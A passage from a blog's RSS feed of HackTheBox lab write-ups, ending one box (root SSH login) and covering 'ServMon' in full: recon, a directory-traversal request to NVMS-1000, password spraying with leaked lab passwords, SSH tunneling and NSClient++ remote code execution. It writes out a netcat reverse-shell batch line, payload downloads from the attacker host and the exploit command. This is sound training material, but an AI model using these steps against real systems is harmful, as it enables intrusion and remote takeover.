<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ chmod <span style="color:#ae81ff">600</span> root_rsa
</code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh -i root_rsa 10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
root@bucket:~# id;hostname;cut -c-15 root.txt 
uid=0(root) gid=0(root) groups=0(root)
bucket
efc73dd09ceb705
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3">https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li>
<li><a href="https://pd4ml.com/html.htm">https://pd4ml.com/html.htm</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - ServMon</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-servmon/</link>
      <pubDate>Tue, 06 Apr 2021 23:09:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-servmon/</guid>
      <description>Exploiting embedded system software</description>
      <content:encoded><![CDATA[<p>ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user&rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I&rsquo;m able to gain a foothold on the system .</p>
<p>In the NSClient++ default installation folder, there is a config file which contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\System.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Directory/Path Traversal</li>
<li>NVMS-1000 exploitation</li>
<li>NSClient-0.5.2.35 exploitation</li>
<li>Port Forwarding/Tunneling</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
<li>NSClient-0.5.2.35 Exploit PoC -  <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ nmap -sC -sV -oA nmap/initial-servmon <span style="color:#e6db74">&#39;10.10.10.184&#39;</span>
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output in all format (xml, nmap, gnmap)</li>
<li><code>-v</code>, verbose mode.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;
|     &lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;
|     &lt;head&gt;
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script type=&#34;text/javascript&#34;&gt;
|     window.location.href = &#34;Pages/login.htm&#34;;
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn&#39;t have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    refox/68.0
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E93410A%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n&#34;)%r(GetRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
....
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -28s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-12T16:27:15
|_  start_date: N/A
</code></pre></div><p>RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box.</p>
<p>Besides these standard ports, there are some interesting services installed on the box:</p>
<ul>
<li>FTP with anonymous login on port 21,</li>
<li>SSH service on port 22</li>
<li>HTTPS service on non-standard port 8443.</li>
</ul>
<p>This machine probably is not an Active Directory.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<pre><code>...&lt;SNIP&gt;...
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
...&lt;SNIP&gt;...
</code></pre><p>Based on <code>nmap</code> scans, the FTP root directory contains the <code>Users</code> folder. Inside the <code>Users</code> folder, I found two subfolders, one is <code>Nathan</code> and the other is <code>Nadine</code>. Both of these users' folders contain a text file, I copied these files to my machine.</p>
<p>The first file is <code>Confidential.txt</code>. It contains a note from <code>Nadine</code> to <code>Nathan</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
</code></pre></div><p>The second file is <code>Notes to do.txt</code>. It contains a to do list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
</code></pre></div><p>I&rsquo;ll note that there&rsquo;s a <code>Password.txt</code> text on <code>Nathan</code>&rsquo;s desktop and the uncompleted to do.</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed, so nothing to see here.</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 redirects me to a login page on <code>Pages/login.htm</code></p>
<p><div class="img-container"><img src="imgs/image-20210406234719034.png" alt="image-20210406234719034"  /></div>
</p>
<p>Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don&rsquo;t find the default credentials, and it doesn&rsquo;t seem to work with common credentials.</p>
<h4 id="exploit-db">Exploit-DB</h4>
<p>A quick search on <code>exploit-db</code> shows it is vulnerable to Directory Traversal.</p>
<blockquote>
<p>PoC: <a href="https://www.exploit-db.com/exploits/47774">https://www.exploit-db.com/exploits/47774</a></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</code></pre></div><p>There&rsquo;s no version is specified, but I&rsquo;ll give it a try.</p>
<h3 id="tcp-8443---nsclient">TCP 8443 - NSClient++</h3>
<h4 id="exploit-db-1">Exploit-DB</h4>
<p><div class="img-container"><img src="imgs/image-20210407052822638.png" alt="image-20210407052822638"  /></div>
</p>
<p>It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding &lsquo;exploit&rsquo; to the keyword pops up an exploit link that refers to exploit-DB:</p>
<ul>
<li>Manual PoC: <a href="https://www.exploit-db.com/exploits/46802">https://www.exploit-db.com/exploits/46802</a></li>
<li>Scripted PoC: <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
</ul>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nadine">Shell as nadine</h3>
<blockquote>
<p>I&rsquo;ve added <code>htb.servmon</code>  to my <code>/etc/hosts</code>, so it will resolve to <code>10.10.10.184</code>. I know <code>htb.servmon</code> looks weird, but that&rsquo;s me in the past hehe..</p>
</blockquote>
<h4 id="nvms-1000-directory-traversal---obtain-passwordstxt">NVMS-1000 Directory Traversal - Obtain Passwords.txt</h4>
<p>I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000</p>
<p><div class="img-container"><img src="imgs/image-20210406234225362.png" alt="image-20210406234225362"  /></div>
</p>
<p>It returns a list of passwords</p>
<p><div class="img-container"><img src="imgs/image-20210406234232390.png" alt="image-20210406234232390"  /></div>
</p>
<h4 id="password-spraying">Password spraying</h4>
<p>I created a usernames list and a password list:</p>
<ul>
<li>
<p><code>users.txt</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">nathan
nadine
</code></pre></div></li>
<li>
<p><code>passwords.txt</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
</code></pre></div></li>
</ul>
<p>With these, a password spray can be performed using <code>CrackMapExec</code>. It hits on <code>nadine:L1k3B1gBut7s@W0rk</code> pair.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ crackmapexec smb htb.servmon -u users -p passwords
...&lt;SNIP&gt;...
SMB         10.10.10.184    <span style="color:#ae81ff">445</span>    SERVMON          <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SERVMON<span style="color:#ae81ff">\n</span>adine:L1k3B1gBut7s@W0rk 
...&lt;SNIP&gt;...
</code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The credentials also work on SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ ssh nadine@htb.servmon
</code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210407055115129.png" alt="image-20210407055115129"  /></div>
</p>
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="obtain-nsclient-password">Obtain NSClient++ password</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
</code></pre></div><p>Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; gc <span style="color:#e6db74">&#39;Program Files\NSClient++\nsclient.ini&#39;</span>
</code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210407055600651.png" alt="image-20210407055600651"  /></div>
</p>
</center>
<p>I&rsquo;ll try the <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">scripted PoC</a>. But before that, I&rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can&rsquo;t perform exploit directly from outside.</p>
<h4 id="ssh-tunneling">SSH Tunneling</h4>
<p>SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I&rsquo;ll create another SSH connection for tunneling.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 
</code></pre></div><p><code>-L 8443:127.0.0.1:8443</code> means it will forward any connection on my localhost port 8443 to remote localhost  on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.</p>
<h4 id="nsclient-exploit-poc">NSClient++ Exploit PoC</h4>
<p>First, I&rsquo;ll create a batch, called <code>sans.bat</code> file on my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">@echo off

C:\Temp\nc.exe 10.10.14.23 443 -e powershell.exe
</code></pre></div><p>Once it created, I&rsquo;ll transfer the file to ServMon on <code>C:\temp\</code> via python http server along with <code>netcat</code> for windows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ Python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>
</code></pre></div><p>Get the hosted files on ServMon</p>
<pre><code>PS C:\&gt; Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat

PS C:\&gt; Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe
</code></pre><p>Now I&rsquo;ll setup a listener on my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ nc -nlvvp <span style="color:#ae81ff">443</span>
</code></pre></div><p>Then I can just run the exploit and wait on my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «servmon» «10.10.14.23»
$ python3 nsRCE.py -t 127.0.0.1 -P <span style="color:#ae81ff">8443</span> -p <span style="color:#e6db74">&#39;ew2x6SsGTxjRwXOT&#39;</span> -c <span style="color:#e6db74">&#34;c:\temp\reverse.bat&#34;</span>
</code></pre></div><p>Now I have an interactive shell as NT Authority\SYSTEM.</p>
<p><div class="img-container"><img src="imgs/image-20210407063703741.png" alt="image-20210407063703741"  /></div>
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
